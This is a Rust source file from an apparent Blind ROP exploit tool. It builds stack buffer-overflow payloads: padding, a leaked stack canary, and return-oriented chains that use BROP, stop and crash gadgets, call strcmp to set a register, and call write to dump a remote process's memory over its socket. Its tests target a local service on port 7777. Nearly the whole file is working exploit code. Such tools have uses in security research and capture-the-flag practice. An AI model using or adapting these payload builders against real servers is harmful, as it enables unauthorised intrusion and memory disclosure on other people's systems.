use std::fmt;

use crate::{
    braille::Braille,
    cluster::{Byte, Cluster, Frame, FrameLike, Word, WordLike},
    gadget::Gadget,
};

#[derive(Clone, PartialEq, Debug)]
pub struct Payload(pub Word);

impl WordLike for Payload {
    fn insert(&mut self, index: usize, element: u8) {
        self.0.insert(index, element)
    }

    fn remove(&mut self, index: usize) -> Byte {
        self.0.remove(index)
    }

    fn from_vec(vec: Vec<Byte>) -> Payload {
        Payload(Word::from_vec(vec))
    }

    fn to_vec(&self) -> Vec<Byte> {
        self.0.to_vec()
    }
}

impl Payload {
    pub fn through_overflow(braille: &mut Braille) -> Option<Payload> {
        let overflow = braille.get_overflow_length()?;
        Some(Payload(Word(vec![b'A'; overflow])))
    }

    pub fn through_canary(braille: &mut Braille) -> Option<Payload> {
        let mut payload = Payload::through_overflow(braille)?;
        if let Some(canary) = braille.get_canary_value() {
            payload.append(Cluster::Frame(canary.to_owned()));
        }
        Some(payload)
    }

    pub fn till_return_address(braille: &mut Braille) -> Option<Payload> {
        let mut payload = Payload::through_canary(braille)?;
        let padding = braille.get_padding_value()?;
        payload.append(Cluster::Word(padding.to_owned()));
        Some(payload)
    }

    pub fn craft_brop_payload(braille: &mut Braille, item: &Gadget) -> Option<Payload> {
        /*
        stack layout:
        padding
        brop_gadget <- return addr
        crash gadget * 6
        stop gadget * 1
        crash gadget * 5

        infinite
        */
        let mut payload = Payload::till_return_address(braille)?;
        let stop_gadget = braille.get_stop_gadget()?;
        let crash_gadget = Frame::from_u64(0xdead_beef_dead_beef);
        payload.append(Cluster::Frame(item.to_frame()));
        for _ in 1..=6 {
            payload.append(Cluster::Frame(crash_gadget.to_owned()));
        }
        payload.append(Cluster::Frame(stop_gadget.to_frame()));
        for _ in 1..=5 {
            payload.append(Cluster::Frame(crash_gadget.to_owned()));
        }
        Some(payload)
    }

    pub fn craft_strcmp_payload(
        braille: &mut Braille,
        item: &Gadget,
        brop_gadget: &Gadget,
        first: Frame,
        second: Frame,
    ) -> Option<Payload> {
        /*
        stack layout:
        padding
        rdi_gadget -> brop gadget to rdi gadget
        first param
        rsi_gadget
        second param
        0xdeadbeefdeadbeef
        strcmp
        */
        let mut payload = Payload::till_return_address(braille)?;
        let rsi_gadget = brop_gadget.to_rsi_gadget();
        let rdi_gadget = brop_gadget.to_rdi_gadget();

        payload.append(Cluster::Frame(rdi_gadget.to_frame()));
        payload.append(Cluster::Frame(first));
        payload.append(Cluster::Frame(rsi_gadget.to_frame()));
        payload.append(Cluster::Frame(second));
        payload.append(Cluster::Frame(Frame::from_u64(0xdead_beef_dead_beef)));
        payload.append(Cluster::Frame(item.to_frame()));
        Some(payload)
    }

    pub fn craft_write_payload(
        braille: &mut Braille,
        write_gadget: &Gadget,
        brop_gadget: &Gadget,
        strcmp_gadget: &Gadget,
        sock: u64,
        dump_len: usize,
    ) -> Option<Payload> {
        /*
        stack layout:
        padding

        rdi gadget
        str (dump length)
        rsi gadget
        str (dump length)
        0xdeadbeefdeadbeef
        strcmp gadget -> rdx

        rdi gadget
        sock
        rsi gadget
        dump addr
        0xdeadbeefdeadbeef
        write gadget
        */
        let dump_addr = braille.get_possible_return_address()?.to_owned() & 0xffff_ffff_ffff_0000;
        let rdi_gadget = brop_gadget.to_rdi_gadget();
        let rsi_gadget = brop_gadget.to_rsi_gadget();
        let mut payload = Payload::till_return_address(braille)?;

        payload.append(Cluster::Frame(rdi_gadget.to_frame()));
        payload.append(Cluster::Word(Word::from_vec(vec![b'A'; dump_len])));
        payload.append(Cluster::Frame(rsi_gadget.to_frame()));
        payload.append(Cluster::Word(Word::from_vec(vec![b'A'; dump_len])));
        payload.append(Cluster::Frame(Frame::from_u64(0xdead_beef_dead_beef)));
        payload.append(Cluster::Frame(strcmp_gadget.to_frame()));

        payload.append(Cluster::Frame(rdi_gadget.to_frame()));
        payload.append(Cluster::Frame(Frame::from_u64(sock)));
        payload.append(Cluster::Frame(rsi_gadget.to_frame()));
        payload.append(Cluster::Frame(dump_addr));
        payload.append(Cluster::Frame(Frame::from_u64(0xdead_beef_dead_beef)));
        payload.append(Cluster::Frame(write_gadget.to_frame()));

        Some(payload)
    }
}

impl fmt::Display for Payload {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

#[cfg(test)]
mod tests {
    use super::Payload;
    use crate::{
        braille::Braille,
        cluster::{Cluster, Frame, Word, WordLike},
    };

    pub fn setup() -> Braille {
        Braille::new("localhost:7777").unwrap()
    }

    #[test]
    fn test_payload_through_overflow() {
        let mut braille = setup();
        assert_eq!(
            Payload::through_overflow(&mut braille).unwrap(),
            Payload(Word(vec![b'A'; 42]))
        );
    }

    #[test]
    fn test_payload_through_canary() {
        let mut braille = setup();
        assert_eq!(50, Payload::through_canary(&mut braille).unwrap().len());
    }

    #[test]
    fn test_payload_till_return_address() {
        let mut braille = setup();
        assert_eq!(
            58,
            Payload::till_return_address(&mut braille).unwrap().len()
        );
    }

    #[test]
    fn test_payload_append() {
        let mut payload = Payload::from_vec(vec![b'a'; 100]);
        payload.append(Cluster::Frame(Frame::from_u64(0xdead_beef_dead_beef)));
        assert_eq!(108, payload.len());
    }
}
